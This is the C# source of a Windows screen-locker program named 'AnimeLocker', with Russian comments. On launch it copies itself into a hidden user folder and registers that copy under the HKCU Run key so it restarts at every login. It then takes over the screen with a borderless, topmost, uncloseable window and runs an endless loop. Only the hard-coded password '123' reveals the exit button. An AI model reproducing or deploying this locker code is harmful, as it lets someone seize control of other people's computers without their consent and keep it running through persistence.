﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Media;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace Locker
{
    public partial class Form1 : Form
    {
        private void Pause(int value)
        {
            Stopwatch sw = new Stopwatch();
            sw.Start();
            while (sw.ElapsedMilliseconds < value)
                Application.DoEvents();
        }
        SoundPlayer Sound = new SoundPlayer(Properties.Resources.Music);
        int i = 0, k = 0, j;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //Создание копии в скрытой папке
            string targetPath = @"C:\Users\CheAnime\";
            Directory.CreateDirectory(targetPath);
            DirectoryInfo dir = new DirectoryInfo(targetPath);
            dir.Attributes |= FileAttributes.Hidden;
            string sourceFile = System.Windows.Forms.Application.ExecutablePath;
            string destFile = System.IO.Path.Combine(targetPath, "AnimeLocker.exe");
            if (System.Windows.Forms.Application.ExecutablePath != destFile)
            {
                System.IO.File.Copy(sourceFile, destFile, true);
            }
            //Добавление копии в автозапуск
            string name = "AnimeLocker";
            string ExePath = destFile;
            Microsoft.Win32.RegistryKey reg;
            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                reg.SetValue(name, ExePath);
                reg.Close();
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); }
            //Начинка
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.ControlBox = false;
            this.WindowState = FormWindowState.Maximized;
            this.TopMost = true;
            this.ShowInTaskbar = false;
            this.FormBorderStyle = FormBorderStyle.None;
            this.Move += delegate { this.Capture = false; };
            //Sound.PlayLooping();
            for (j = 0; j <= 2; j++)
            {
                
                j--;
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            //if (k == 0) e.Cancel = true;
        }
        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            //Sound.Stop();
        }
        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "123") { exitbutton.Visible = true; k = 1; }
        }
        private void exitbutton_Click(object sender, EventArgs e)
        {
            //Удаление из автозапуска
            Microsoft.Win32.RegistryKey reg;
            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                reg.DeleteValue("AnimeLocker");
                reg.Close();
            }
            catch { }
            //Удаление папки с копией
            string targetPath = @"C:\Users\CheAnime\";
            DirectoryInfo dir = new DirectoryInfo(targetPath);
            dir.Delete(true);

            Environment.Exit(0);
        }
    }
}
